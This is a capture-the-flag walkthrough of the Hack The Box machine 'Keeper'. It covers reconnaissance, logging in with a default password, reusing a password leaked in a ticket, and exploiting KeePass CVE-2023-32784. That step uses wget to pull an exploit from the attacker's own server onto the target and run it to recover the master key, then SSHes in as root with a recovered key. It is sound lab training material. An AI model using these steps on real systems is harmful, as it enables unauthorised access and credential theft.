# HTB KEEPER Walktrough

This walktrough is about the "hacking" of the HTB box "Keeper"

## Step 1: Getting Information
### Simple NMAP scan

```bash
sudo nmap -sV {IP}
```
![image](https://github.com/chris-devel0per/htb-keeper/assets/101336067/56cdfc90-2329-4d9a-a052-959e842ac1ac)

What interests us here is the open TCP port 80. This port hosts an Nginx server that's up and running. So, we'll go ahead and check out this website. On the page, there's a text that points us to 'tickets.keeper.htb/rt/'. That's where we'll head next.

### Visit of the Website

![image](https://github.com/chris-devel0per/htb-keeper/assets/101336067/01164585-ca00-434b-b5e8-762d7adc4148)


When we go to 'tickets.keeper.htb/rt/', this error message greets us. To bypass this error, we attempt to include the domain in our hosts file.


```bash
sudo nano /etc/hosts
```
![image](https://github.com/chris-devel0per/htb-keeper/assets/101336067/62d8b29c-6404-4f6e-9442-eedf3e1bb436)


After reloading the page, the website becomes visible!

![image](https://github.com/chris-devel0per/htb-keeper/assets/101336067/a2f4c715-c200-4818-b5ff-82e903f35707)


## Step 2: Exploiting User Access

Initially, my approach involved searching for potential CVEs. While I did come across a few, unfortunately, none of them proved to be useful for this particular box.

As a next step, I decided to give the default password a shot: 

![image](https://github.com/chris-devel0per/htb-keeper/assets/101336067/72e53b79-d2d7-4295-be5c-926febc67e64)


### And Success! We're In!

After conducting some tests within the ticket system, I managed to uncover this user: 

![image](https://github.com/chris-devel0per/htb-keeper/assets/101336067/0f1c78a9-52ed-4afe-8e00-396779f359e3)


I stumbled upon an interesting comment related to the user!

![image](https://github.com/chris-devel0per/htb-keeper/assets/101336067/0aa0fc38-35a8-441e-882d-097c6f4bd812)


Thus, I decided to attempt an SSH connection using the following command:

```bash
ssh lnorgaard@10.10.11.227
```

![image](https://github.com/chris-devel0per/htb-keeper/assets/101336067/9574802d-5429-4301-8c21-4ca21026bddd)


That approach worked like a charm! Fantastic!

Additionally, I came across the 'user flag.txt' as well.


![image](https://github.com/chris-devel0per/htb-keeper/assets/101336067/deaf72e0-5c3a-4232-8365-713c59619443)


## Step 3: Escalating Privileges

Within lnorgaard's ticket, I stumbled upon this intriguing message:

![image](https://github.com/chris-devel0per/htb-keeper/assets/101336067/885363ac-25d3-4e07-8541-9c304e3630df)

With the recent Keepass bug fresh in my mind, I began to search for potential avenues. After a brief investigation, I came across the CVE "CVE-2023-32784" and an existing functional exploit available at https://github.com/CMEPW/keepass-dump-masterkey.


### Uploading the PoC to the Server

To upload the PoC to the server, follow these steps:

1. Begin by downloading the script to your client machine using this command:

   ```bash
   wget https://raw.githubusercontent.com/CMEPW/keepass-dump-masterkey/main/poc.py
   ```

2. Next, start an HTTP server on your local machine using:

   ```bash
   python3 -m http.server
   ```

3. After that, you need to download the Python script to the HTB client with:

   ```bash
   wget https://{YOUR VPNIP}:8000/poc.py
   ```

4. Finally, execute the Python script using:

   ```bash
   python3 poc.py KeePassDumpFull.dmp
   ```

Running the script should produce the following output:

![image](https://github.com/chris-devel0per/htb-keeper/assets/101336067/41f3101f-54f0-43b2-b498-cb96e24870f8)

Since the obtained output isn't the actual password, we'll need to dig deeper to uncover the real password. Noticing that certain letters remain consistent, I'll focus on those.

To deduce the password, I've attempted a unique approach: replacing the special characters with '*' and using this modified pattern to search for clues online.

![image](https://github.com/chris-devel0per/htb-keeper/assets/101336067/8827332c-cc0f-4551-a920-e17a8aa3473d)

The initial search yields the result 'Rødgrød med fløde.' I'll proceed to test this phrase on the downloaded Keepass file.

![image](https://github.com/chris-devel0per/htb-keeper/assets/101336067/95466858-8f3b-4115-a44f-306bcf4a484a)

Unfortunately, 'Rødgrød med fløde' didn't work. I'll now attempt the same phrase in full lowercase.

![image](https://github.com/chris-devel0per/htb-keeper/assets/101336067/e78f26d9-b4e4-4d6e-bfb6-9971432085b4)

Once again, success! Great job!

![image](https://github.com/chris-devel0per/htb-keeper/assets/101336067/4bce287c-0eaa-42b2-a06c-06c32313221a)



In the Network category, a Putty SSH key for the root user is discovered. To use this Putty SSH key on Linux, it needs to be converted from the '.ppk' format to the '.pem' format. The conversion process can be achieved using the 'puttygen' package. It's important to create a separate file for each note in the Keepass, ensuring the entire note content is copied into the new file.

If the key file is named 'keeper.ppk', here's the command to perform the conversion:

```bash
puttygen keeper.ppk -O private-openssh -o htb.pem
```

Following the conversion, you can SSH to the server using the Linux SSH key:

```bash
ssh root@10.10.11.227 -i htb.pem 
```

With this setup, you'll have access to retrieve the root flag!

![image](https://github.com/chris-devel0per/htb-keeper/assets/101336067/3350909d-0a31-4ff7-bf34-d18d3606e6a6)

